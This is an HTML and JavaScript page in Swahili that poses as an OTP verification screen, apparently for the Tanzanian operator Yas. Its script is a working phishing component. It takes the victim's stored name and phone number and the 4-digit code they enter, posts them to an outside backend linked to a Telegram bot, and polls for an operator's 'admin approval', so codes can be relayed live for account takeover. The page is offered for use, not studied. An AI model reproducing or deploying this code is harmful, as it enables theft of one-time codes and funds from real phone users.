<!DOCTYPE html>
<html lang="sw">
<head>
<meta charset="UTF-8">
<title>Uthibitisho wa OTP</title>

<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: #f0f4f0;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
}
.page {
  width: 100%;
  max-width: 500px;
}
.card {
  background: #ffffff;
  border-radius: 16px;
  padding: 35px 30px;
  box-shadow: 0 8px 30px rgba(26, 67, 41, 0.10);
  border: 1px solid #e6efe6;
}
.title {
  font-size: 26px;
  font-weight: 700;
  color: #1a6b2a;
  margin-bottom: 6px;
}
.subtitle {
  color: #5a6b5a;
  font-size: 15px;
  margin-bottom: 4px;
}
.display-number {
  color: #1a2b1a;
  font-weight: 700;
  font-size: 16px;
  margin-bottom: 22px;
  background: #f4f9f4;
  padding: 8px 14px;
  border-radius: 8px;
  display: inline-block;
}
.label {
  font-size: 15px;
  font-weight: 600;
  color: #1a2b1a;
  margin-bottom: 10px;
}
/* New OTP input styling */
.otp-input {
  width: 100%;
  padding: 16px 18px;
  font-size: 28px;
  font-family: inherit;
  letter-spacing: 8px;
  text-align: center;
  border: 2px solid #d0e0d0;
  border-radius: 12px;
  background: #fafffa;
  outline: none;
  transition: border-color 0.2s, box-shadow 0.2s;
}
.otp-input:focus {
  border-color: #1a7a2a;
  box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.15);
}
button {
  width: 100%;
  height: 54px;
  border: none;
  border-radius: 12px;
  font-size: 17px;
  font-weight: 700;
  background: #d4e0d4;
  color: #8a9f8a;
  cursor: pointer;
  transition: background 0.25s, transform 0.1s;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
}
button:not(:disabled) {
  background: #1a7a2a;
  color: #ffffff;
}
button:not(:disabled):hover {
  background: #136622;
  transform: scale(1.01);
}
.spinner {
  width: 18px;
  height: 18px;
  border: 3px solid rgba(255,255,255,0.3);
  border-top: 3px solid #ffffff;
  border-radius: 50%;
  animation: spin 0.9s linear infinite;
  display: none;
}
@keyframes spin { to { transform: rotate(360deg); } }
#status {
  margin-top: 16px;
  text-align: center;
  font-size: 14px;
  font-weight: 500;
  color: #c0392b;
  min-height: 22px;
}
#status.success { color: #1a7a2a; }
</style>
</head>

<body>
<div class="page">
  <div class="card">
    <div class="title">Uthibitisho wa OTP</div>
    <div class="subtitle">Weka OTP iliyotumwa kwenye nambari yako ya simu</div>
    <div id="phoneNumber" class="display-number"></div>

    <form id="otpForm">
      <div class="label">Ingiza nambari ya 4-digit OTP</div>
      <input id="otpInput" class="otp-input" type="text" 
             inputmode="numeric" pattern="[0-9]*" maxlength="4"
             placeholder="_ _ _ _" autocomplete="off" />

      <button id="submitBtn" disabled>
        <span id="btnText">WASILISHA</span>
        <span class="spinner" id="spinner"></span>
      </button>
    </form>
    <div id="status"></div>
  </div>
</div>

<script>
// ===== CORRECTED BACKEND URL =====
const BACKEND_URL = "https://yas-tanzania.onrender.com";

const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');

if (!botId) {
  document.getElementById('status').textContent = "Error: Missing bot ID. Please use the link from Telegram.";
  throw new Error("Bot ID missing");
}

const phone = localStorage.getItem('phone') || "";
document.getElementById('phoneNumber').textContent =
  phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "No phone number found";

const otpInput = document.getElementById('otpInput');
const submitBtn = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');
const spinner = document.getElementById('spinner');
const statusEl = document.getElementById('status');

// Restrict input to digits only
otpInput.addEventListener('input', function() {
  this.value = this.value.replace(/\D/g, '');
  const isValid = this.value.length === 4;
  submitBtn.disabled = !isValid;
  if (statusEl.textContent) statusEl.textContent = '';
});

// Auto‑focus on page load
window.addEventListener('load', function() {
  otpInput.focus();
});

async function sendOtpToTelegram(name, phone, code) {
  try {
    const r = await fetch(`${BACKEND_URL}/submit-code`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, phone, code, botId })
    });
    return r.json();
  } catch {
    return null;
  }
}

function pollCodeApproval(requestId) {
  return new Promise(resolve => {
    const interval = setInterval(async () => {
      try {
        const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
        const d = await r.json();
        if (d.approved === true || d.approved === false) {
          clearInterval(interval);
          resolve(d.approved);
        }
      } catch (e) {
        // keep polling
      }
    }, 1500);
  });
}

document.getElementById('otpForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const code = otpInput.value.trim();
  if (code.length !== 4) {
    statusEl.textContent = "Tafadhali ingiza nambari kamili ya tarakimu 4.";
    return;
  }

  const name = localStorage.getItem('firstName') || localStorage.getItem('name') || "Unknown";
  const phone = localStorage.getItem('phone') || "Unknown";

  submitBtn.disabled = true;
  btnText.textContent = "VERIFYING...";
  spinner.style.display = "inline-block";
  statusEl.textContent = "Sending OTP for verification...";
  statusEl.className = '';

  const res = await sendOtpToTelegram(name, phone, code);

  if (!res || !res.requestId) {
    statusEl.textContent = "Failed to send. Please try again.";
    submitBtn.disabled = false;
    btnText.textContent = "WASILISHA";
    spinner.style.display = "none";
    return;
  }

  statusEl.textContent = "Waiting for admin approval...";
  const approved = await pollCodeApproval(res.requestId);

  if (approved === true) {
    localStorage.setItem('code', code);
    statusEl.textContent = "OTP approved! Redirecting...";
    statusEl.className = 'success';
    setTimeout(() => {
      window.location.href = `success.html?botId=${botId}`;
    }, 500);
  } else {
    statusEl.textContent = "OTP rejected. Please try again.";
    otpInput.value = "";
    submitBtn.disabled = true;
    btnText.textContent = "WASILISHA";
    spinner.style.display = "none";
    otpInput.focus();
  }
});

submitBtn.addEventListener('click', function(e) {
  if (!this.disabled) {
    document.getElementById('otpForm').dispatchEvent(new Event('submit'));
  }
});
</script>
</body>
</html>
